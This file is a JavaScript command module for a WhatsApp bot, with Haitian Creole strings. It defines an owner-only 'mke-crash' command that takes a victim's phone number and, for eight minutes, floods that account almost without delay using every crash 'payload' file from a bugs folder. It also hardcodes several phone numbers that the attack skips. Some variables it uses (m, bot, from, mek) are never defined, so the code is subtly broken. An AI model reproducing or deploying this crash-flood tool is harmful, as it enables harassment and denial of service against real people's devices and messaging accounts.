const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'mke-crash',
  desc: '⚠️ Atak rapid ak tout payloads pou 8 minit',
  category: 'bug',
  react: '💣',
  filename: __filename
}, async (client, message, args, { reply, isOwner }) => {
  if (!isOwner) return reply("❌ This command is for the bot *owner only*.");

  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'mke-crash') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await reply(`❌ Usage:\n${prefix}mke-crash <numero>`);
    }

    const protectedNumbers = ['50941350366', '50938091691', '13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await reply('🛡️ 🛡️ This number is protected. Attack canceled.');
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsFolder = path.join(__dirname, '../bugs');
    const payloadFiles = fs.readdirSync(bugsFolder).filter(f => f.endsWith('.js'));

    if (payloadFiles.length === 0) {
      return await reply('📁 Pa gen payload nan folder `/bugs`.');
    }

    // Voye imaj anvan atak
    const imgPath = path.join(__dirname, '../media/5.png');
    const imgBuf = fs.readFileSync(imgPath);
    await bot.sendMessage(from, {
      image: imgBuf,
      caption: `💥 *mke-crash active*\n👤 Target: wa.me/${targetNumber}\n⏱️ Duration: 8 minutes\n📦 Payloads: ${payloadFiles.length}\n🚀 Speed: ultra rapid`,
    }, { quoted: mek });

    const endTime = Date.now() + 8 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of payloadFiles) {
        try {
          const bugPath = path.join(bugsFolder, file);
          let payload = require(bugPath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            const text = payload.default;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text });
            };
          }

          if (typeof payload === 'string') {
            const text = payload;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text });
            };
          }

          if (typeof payload === 'function') {
            await payload(bot, targetNumber);
          }

        } catch (err) {
          console.error(`❌ Payload error (${file}):`, err.message);
        }

        await new Promise(res => setTimeout(res, 0.1)); // 0.1ms delay = ultra fast
      }
    }

    await reply(`✅ *mke-crash* fini sou +${targetNumber}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});